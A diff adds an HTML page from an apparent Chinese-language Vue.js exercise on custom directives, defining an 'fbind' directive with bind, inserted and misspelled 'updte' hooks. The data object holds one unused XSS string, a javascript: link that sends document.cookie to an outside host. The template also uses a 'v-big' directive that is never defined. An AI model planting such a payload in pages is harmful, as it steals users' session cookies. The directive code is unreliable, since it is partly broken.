@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script type="text/javascript" src="../vue/vue.js"></script>
+</head>
+<body>
+    <!-- 
+        本次总结：
+              
+
+                    
+     -->
+    <div class="ming">
+          
+          <h2>当前的n值是:<span v-text="n"></span></h2> 
+          <h2>放大10倍后n的值是：<span v-big="n"></span></h2>  
+          <h1>放大10倍后n的值是：<em v-big="n"></em></h1>  
+          <button @click="n++">点我加1</button>
+          <hr>
+          <input type="text" v-fbind:value="n">
+          
+
+    </div>
+     <script>
+         Vue.config.productionTip = false
+         
+        const vm = new Vue({
+            el:'.ming',
+            data:{
+              name:'李明',
+              str:'<h1>明姐我还是想你</h1>',
+              str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟有好东西哟</a>',
+              n:1
+            },
+            directives:{
+                
+                    // 此处的element接受的实参就是绑定该指令的真实dom结构，说白了也就是携带这个的标签
+                    // 此处的接受的实参是一个对象，什么对象不中要，它里面有一个value就是你在指令等号后引号中的结果
+               
+                // 这是第二种写法：属性后跟的时对象字对象里面写的是每个特殊时期调用的函数
+                fbind:{
+                    // 指令与元素绑定成功时调用的函数
+                    bind(element,binding){
+                      element.value=binding.value
+                    },
+                    // 指令所在元素被插入页面时调用的函数
+                    inserted(element,binding){
+                        element.focus()
+                    },
+                    // 指令所在模板被重新解析时调用的函数
+                    updte(element,binding){
+                      element.value=binding.value
+                    }
+                }
+            }
+            
+          })
+     </script>
+    
+</body>
+</html>
